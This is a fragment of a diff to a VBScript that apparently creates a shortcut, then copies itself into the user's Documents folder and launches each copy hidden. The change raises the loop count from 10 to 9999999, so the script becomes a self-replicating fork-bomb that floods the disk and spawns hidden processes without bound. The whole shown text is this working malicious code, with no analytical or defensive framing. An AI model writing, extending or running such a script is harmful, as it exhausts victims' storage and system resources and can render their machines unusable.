@@ -10,7 +10,7 @@ objShellLink.Save
 
 ' Copy script to Documents folder
 strDocumentsPath = WshShell.SpecialFolders("MyDocuments")
-For i = 1 to 10
+For i = 1 to 9999999
     fso.CopyFile WScript.ScriptFullName, strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs", True
     WshShell.Run chr(34) & strDocumentsPath & "\" & fso.GetFileName(WScript.ScriptFullName) & i & ".vbs" & chr(34), 0, False
 Next
